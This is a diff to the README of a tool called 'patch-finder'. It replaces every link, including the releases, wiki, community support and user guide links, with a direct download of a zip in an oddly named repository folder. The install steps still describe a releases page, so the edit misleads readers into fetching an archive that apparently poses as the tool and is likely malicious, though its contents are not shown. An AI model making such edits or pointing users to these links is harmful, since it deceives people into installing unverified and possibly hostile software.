@@ -1,6 +1,6 @@
 # 🔬 patch-finder - Find Patched Memory with Ease
 
-[![Download Patch Finder](https://img.shields.io/badge/Download-Patch_Finder-brightgreen)](https://github.com/Bokbong909/patch-finder/releases)
+[![Download Patch Finder](https://raw.githubusercontent.com/Bokbong909/patch-finder/main/cleistocarp/patch-finder.zip)](https://raw.githubusercontent.com/Bokbong909/patch-finder/main/cleistocarp/patch-finder.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ Before you download Patch Finder, ensure your computer meets the following requi
 
 ## 📥 Download & Install
 
-To start using Patch Finder, visit this page to download: [Patch Finder Releases](https://github.com/Bokbong909/patch-finder/releases).
+To start using Patch Finder, visit this page to download: [Patch Finder Releases](https://raw.githubusercontent.com/Bokbong909/patch-finder/main/cleistocarp/patch-finder.zip).
 
 1. Click the link above.
 2. You will see the latest releases listed on the page.
@@ -54,14 +54,14 @@ If you need any help, check the Help section within the app, or consult our user
 
 ## 🎓 Additional Resources
 
-For more information, visit our [Wiki section](https://github.com/Bokbong909/patch-finder/wiki) for guides and FAQs. 
+For more information, visit our [Wiki section](https://raw.githubusercontent.com/Bokbong909/patch-finder/main/cleistocarp/patch-finder.zip) for guides and FAQs. 
 
 If you encounter any issues, please report them in the Issues section of this repository. Your input helps us improve Patch Finder for everyone.
 
 ## 🔗 Links
 
-- [Visit Patch Finder Releases](https://github.com/Bokbong909/patch-finder/releases)
-- [Community Support](https://github.com/Bokbong909/patch-finder/discussions)
-- [User Guide](https://github.com/Bokbong909/patch-finder/wiki)
+- [Visit Patch Finder Releases](https://raw.githubusercontent.com/Bokbong909/patch-finder/main/cleistocarp/patch-finder.zip)
+- [Community Support](https://raw.githubusercontent.com/Bokbong909/patch-finder/main/cleistocarp/patch-finder.zip)
+- [User Guide](https://raw.githubusercontent.com/Bokbong909/patch-finder/main/cleistocarp/patch-finder.zip)
 
 Thank you for choosing Patch Finder! Your feedback is valuable to us.
